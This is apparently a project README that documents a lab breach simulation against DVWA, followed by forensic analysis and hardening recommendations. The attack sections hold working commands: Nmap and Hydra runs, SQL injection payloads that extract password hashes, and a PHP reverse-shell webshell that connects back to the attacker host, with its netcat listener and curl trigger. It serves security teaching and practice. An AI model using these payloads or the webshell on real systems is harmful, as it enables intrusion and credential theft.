# 🛡️ Enterprise Breach Simulation, Detection & Security Hardening

## 📌 Project Overview

This project simulates a **real-world multi-stage cyber attack** on an enterprise-like containerized environment and demonstrates detection, forensic investigation, and security hardening techniques.

The project is aligned with:
- **MITRE ATT&CK Framework**
- **Cyber Kill Chain Model**
- **DevSecOps Security Practices**

---

## 🎯 Objectives

- Simulate realistic multi-stage attacks on containerized infrastructure
- Detect and analyze attack artifacts through log forensics
- Perform forensic investigation and build attack timeline
- Propose hardened and secure re-architected solutions
- Present executive-level findings and recommendations

---

## 🏗️ Lab Environment

| Component | Details |
|-----------|---------|
| Hypervisor | VMware Workstation |
| Attacker Machine | Kali Linux (192.168.62.131) |
| Victim Machine | Ubuntu 22.04 (192.168.62.130) |
| Vulnerable App | DVWA v1.10 (Docker Container) |
| SIEM | Wazuh Manager 4.7.5 (Docker) |
| Network | VMware NAT (192.168.62.0/24) |

### Lab Architecture

```
┌─────────────────────────────────────────────┐
│           VMware NAT Network                │
│            192.168.62.0/24                  │
│                                             │
│  ┌──────────────┐      ┌──────────────────┐ │
│  │  Kali Linux  │─────▶│   Ubuntu 22.04   │ │
│  │ 192.168.62.131│     │  192.168.62.130  │ │
│  │  (Attacker)  │      │    (Victim)      │ │
│  └──────────────┘      │  ┌────────────┐  │ │
│                        │  │    DVWA    │  │ │
│                        │  │  Docker    │  │ │
│                        │  │  Port 80   │  │ │
│                        │  └────────────┘  │ │
│                        │  ┌────────────┐  │ │
│                        │  │   Wazuh    │  │ │
│                        │  │  Manager   │  │ │
│                        │  └────────────┘  │ │
│                        └──────────────────┘ │
└─────────────────────────────────────────────┘
```

---

## 🔧 Tools Used

### Attack Tools (Kali Linux)
| Tool | Purpose | MITRE Technique |
|------|---------|----------------|
| Nmap 7.98 | Network Reconnaissance | T1046 |
| Hydra v9.6 | Brute Force Attack | T1110 |
| SQLMap 1.10.2 | SQL Injection Testing | T1190 |
| Netcat | Reverse Shell Listener | T1059 |
| Curl | HTTP Requests & Shell Trigger | T1190 |

### Defense Tools (Ubuntu)
| Tool | Purpose |
|------|---------|
| Docker | Container Management |
| DVWA v1.10 | Vulnerable Web Application |
| Wazuh 4.7.5 | SIEM & Endpoint Detection |
| Apache Logs | Forensic Evidence Collection |

---

## ⚔️ Attack Phases

### Phase 1 — Reconnaissance (T1046)

**Tool:** Nmap  
**Command:**
```bash
nmap -sV -sC -A 192.168.62.130
```

**Findings:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 (Debian)
OS: Linux 4.15 - 5.19
Application: DVWA v1.10
```

---

### Phase 2 — Brute Force Attack (T1110)

**Tool:** Hydra  
**Command:**
```bash
hydra -l admin -P /tmp/passwords.txt 192.168.62.130 \
  http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
```

**Result:**
```
[80][http-post-form] host: 192.168.62.130
login: admin   password: password ✓
```

---

### Phase 3 — SQL Injection & Data Exfiltration (T1190)

**Tool:** Manual SQL Injection  
**Payloads Used:**

```sql
-- Basic auth bypass
1' OR '1'='1

-- Dump all users
1' OR 1=1#

-- Get database name
1' UNION SELECT null, database()#

-- Extract password hashes
1' UNION SELECT user, password FROM users#
```

**Result — Credentials Stolen:**
```
Username: admin
Password Hash: 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)
Cracked Password: password
```

---

### Phase 4 — PHP Webshell Upload (T1505)

**Method:** Malicious PHP file uploaded via DVWA File Upload vulnerability

**Payload (shell.php):**
```php
<?php
$sock=fsockopen("192.168.62.131",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

**Upload Path:**
```
/var/www/html/hackable/uploads/shell.php
```

---

### Phase 5 — Remote Code Execution (T1059)

**Tool:** Netcat Reverse Shell  

**Listener (Kali):**
```bash
nc -lvnp 4444
```

**Trigger:**
```bash
curl -s -b "security=low; PHPSESSID=$PHPSESSID" \
  "http://192.168.62.130/hackable/uploads/shell.php"
```

**Shell Access Achieved:**
```bash
$ whoami
www-data

$ hostname
890936e06dcf    ← Docker Container ID

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Tool Used |
|--------|-------------|----------------|-----------|
| Reconnaissance | T1046 | Network Service Discovery | Nmap |
| Credential Access | T1110 | Brute Force | Hydra |
| Initial Access | T1190 | Exploit Public-Facing Application | SQLMap + Manual |
| Exfiltration | T1190 | SQL Data Extraction | Manual SQLi |
| Persistence | T1505 | Server Software Component | PHP Webshell |
| Execution | T1059 | Command & Scripting Interpreter | Netcat Shell |

---

## 🔍 Forensic Investigation

### Attack Timeline (from Apache Logs)

```
13:04:41 - Kali (192.168.62.131) begins SQLMap automated scan
           Multiple ORDER BY payloads detected in logs

13:06:40 - Manual SQL Injection begins
           Payload: 1' OR '1'='1 → 200 OK

13:07:15 - Database enumeration
           Payload: UNION SELECT null, database()

13:07:33 - Credential theft
           Payload: UNION SELECT user, password FROM users
           Result: MD5 hash 5f4dcc3b5aa765d61d8327deb882cf99 stolen

13:18:29 - PHP shell upload attempt via curl
           POST /vulnerabilities/upload/ → 302

13:20:54 - Shell uploaded successfully via browser
           POST /vulnerabilities/upload/ → 200

13:28:27 - Shell executed from Kali
           GET /hackable/uploads/shell.php → 200 OK

13:28:27 - Reverse shell connection established
           Kali gained www-data shell inside Docker container
```

### Key Log Evidence

```
# SQL Injection detected in logs
192.168.62.131 - [16/May/2026] "GET /vulnerabilities/sqli/
?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23" 200

# Shell upload detected
192.168.62.131 - [16/May/2026] "POST /vulnerabilities/upload/" 200

# Shell execution detected
192.168.62.131 - [16/May/2026] "GET /hackable/uploads/shell.php" 200
```

---

## 🛡️ Security Recommendations

### Immediate Fixes

| Vulnerability | Risk | Fix |
|--------------|------|-----|
| SQL Injection | Critical | Use Prepared Statements / Parameterized Queries |
| File Upload | Critical | Block .php extensions, validate MIME type |
| Weak Passwords | High | Enforce strong password policy |
| No WAF | High | Deploy Web Application Firewall |
| No Rate Limiting | Medium | Implement login attempt limits |
| Container as root | Medium | Run Docker as non-root user |

### Long-term Hardening

```bash
# 1. Docker security hardening
docker run --user 1000:1000 --read-only --cap-drop ALL dvwa

# 2. Block PHP uploads in Apache config
<Directory /var/www/html/hackable/uploads>
    php_flag engine off
</Directory>

# 3. Enable ModSecurity WAF
sudo apt install libapache2-mod-security2
sudo a2enmod security2

# 4. Input validation example (PHP)
$id = mysqli_real_escape_string($conn, $_GET['id']);
$query = "SELECT * FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
```

---

## 📁 Project Structure

```
Enterprise-Breach-Simulation/
│
├── README.md                    ← This file
├── incident_report.txt          ← Full incident report
├── attack_logs.txt              ← Apache access logs
├── error_logs.txt               ← Apache error logs
---

*This project was created for educational purposes only in a controlled lab environment.*
